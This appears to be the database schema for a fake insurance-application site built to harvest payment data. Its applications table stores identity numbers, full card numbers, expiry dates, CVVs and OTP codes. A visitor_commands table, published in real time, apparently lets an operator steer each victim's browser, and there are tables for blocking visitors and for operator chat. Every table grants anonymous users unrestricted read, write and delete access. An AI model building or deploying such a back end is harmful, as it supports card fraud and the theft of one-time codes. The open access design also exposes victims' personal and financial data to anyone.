CREATE TABLE public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  full_name TEXT,
  identity TEXT,
  birth_date TEXT,
  phone TEXT,
  insurance_type TEXT,
  start_date TEXT,
  purpose TEXT,
  est_value TEXT,
  car_year TEXT,
  car_model TEXT,
  repair_place TEXT,
  company TEXT,
  type TEXT,
  price NUMERIC,
  total NUMERIC,
  method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT,
  card_name TEXT,
  card_exp_month TEXT,
  card_exp_year TEXT,
  card_cvv TEXT,
  card_brand TEXT,
  otp_code TEXT
);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role;

ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;

CREATE POLICY "public_select_applications" ON public.applications FOR SELECT USING (true);
CREATE POLICY "public_insert_applications" ON public.applications FOR INSERT WITH CHECK (true);
CREATE POLICY "public_update_applications" ON public.applications FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "public_delete_applications" ON public.applications FOR DELETE USING (true);

ALTER TABLE public.applications REPLICA IDENTITY FULL;
ALTER PUBLICATION supabase_realtime ADD TABLE public.applications;

CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS TRIGGER LANGUAGE plpgsql SET search_path = public AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$;

CREATE TRIGGER applications_set_updated_at
BEFORE UPDATE ON public.applications
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE public.visitor_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL,
  command TEXT NOT NULL,
  payload TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX idx_visitor_commands_visitor ON public.visitor_commands(visitor_id, created_at DESC);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_commands TO anon, authenticated;
GRANT ALL ON public.visitor_commands TO service_role;

ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;

CREATE POLICY "vc_select" ON public.visitor_commands FOR SELECT USING (true);
CREATE POLICY "vc_insert" ON public.visitor_commands FOR INSERT WITH CHECK (true);
CREATE POLICY "vc_delete" ON public.visitor_commands FOR DELETE USING (true);

ALTER TABLE public.visitor_commands REPLICA IDENTITY FULL;
ALTER PUBLICATION supabase_realtime ADD TABLE public.visitor_commands;

CREATE TABLE public.blocked_visitors (
  visitor_id TEXT PRIMARY KEY,
  reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_visitors TO anon, authenticated;
GRANT ALL ON public.blocked_visitors TO service_role;

ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;

CREATE POLICY "bv_select" ON public.blocked_visitors FOR SELECT USING (true);
CREATE POLICY "bv_insert" ON public.blocked_visitors FOR INSERT WITH CHECK (true);
CREATE POLICY "bv_delete" ON public.blocked_visitors FOR DELETE USING (true);

ALTER TABLE public.blocked_visitors REPLICA IDENTITY FULL;
ALTER PUBLICATION supabase_realtime ADD TABLE public.blocked_visitors;

CREATE TABLE public.chat_conversations (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  visitor_id TEXT NOT NULL,
  customer_name TEXT NOT NULL DEFAULT '',
  customer_phone TEXT NOT NULL DEFAULT '',
  initiated_by TEXT NOT NULL DEFAULT 'customer' CHECK (initiated_by IN ('customer', 'admin')),
  last_message_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  unread_admin INT NOT NULL DEFAULT 0,
  unread_customer INT NOT NULL DEFAULT 0,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX idx_chat_conversations_visitor ON public.chat_conversations(visitor_id);
CREATE INDEX idx_chat_conversations_last_msg ON public.chat_conversations(last_message_at DESC);

CREATE TABLE public.chat_messages (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL CHECK (sender IN ('customer', 'admin')),
  content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX idx_chat_messages_conv ON public.chat_messages(conversation_id, created_at);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_conversations TO anon, authenticated;
GRANT ALL ON public.chat_conversations TO service_role;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_messages TO anon, authenticated;
GRANT ALL ON public.chat_messages TO service_role;

ALTER TABLE public.chat_conversations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can read conversations" ON public.chat_conversations FOR SELECT USING (true);
CREATE POLICY "Anyone can create conversations" ON public.chat_conversations FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update conversations" ON public.chat_conversations FOR UPDATE USING (true);
CREATE POLICY "Anyone can delete conversations" ON public.chat_conversations FOR DELETE USING (true);

CREATE POLICY "Anyone can read messages" ON public.chat_messages FOR SELECT USING (true);
CREATE POLICY "Anyone can create messages" ON public.chat_messages FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can delete messages" ON public.chat_messages FOR DELETE USING (true);

CREATE TRIGGER trg_chat_conversations_updated
  BEFORE UPDATE ON public.chat_conversations
  FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_conversations;
ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages;
ALTER TABLE public.chat_conversations REPLICA IDENTITY FULL;
ALTER TABLE public.chat_messages REPLICA IDENTITY FULL;